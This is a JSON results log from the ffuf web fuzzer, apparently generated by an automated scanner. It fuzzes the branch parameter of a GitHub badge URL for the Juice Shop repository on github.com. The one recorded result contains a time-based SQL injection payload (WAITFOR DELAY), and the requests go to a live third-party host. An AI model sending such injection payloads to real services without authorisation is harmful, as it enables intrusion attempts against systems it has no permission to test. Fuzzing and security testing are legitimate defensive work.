{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/925605e9-6848-4e06-bf56-d5c8ec340719.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713752942.json -u https://github.com/juice-shop/juice-shop/workflows/CI/CD%20Pipeline/badge.svg?branch=master\u0026branch=FUZZ -H referer: https://github.com/juice-shop/juice-shop -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36","time":"2025-08-21T02:15:53+08:00","results":[{"input":{"FFUFHASH":"64cec1","FUZZ":"adminccDXvNoK"},"position":1,"status":400,"length":90,"words":8,"lines":4,"content-type":"text/html","redirectlocation":"","scraper":{},"duration":12104750,"resultfile":"","url":"https://github.com/juice-shop/juice-shop/workflows/CI/CD%20Pipeline/badge.svg?branch=master\u0026branch=';WAITFOR DELAY '0:0:5'--","host":"github.com"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/925605e9-6848-4e06-bf56-d5c8ec340719.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713752942.json -u https://github.com/juice-shop/juice-shop/workflows/CI/CD%20Pipeline/badge.svg?branch=master\u0026branch=FUZZ -H referer: https://github.com/juice-shop/juice-shop -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{"Referer":"https://github.com/juice-shop/juice-shop","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36"},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/925605e9-6848-4e06-bf56-d5c8ec340719.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{"size":{"value":"2308"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713752942.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"https://github.com/juice-shop/juice-shop/workflows/CI/CD%20Pipeline/badge.svg?branch=master\u0026branch=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/925605e9-6848-4e06-bf56-d5c8ec340719.txt"],"http2":false,"client-cert":"","client-key":""}}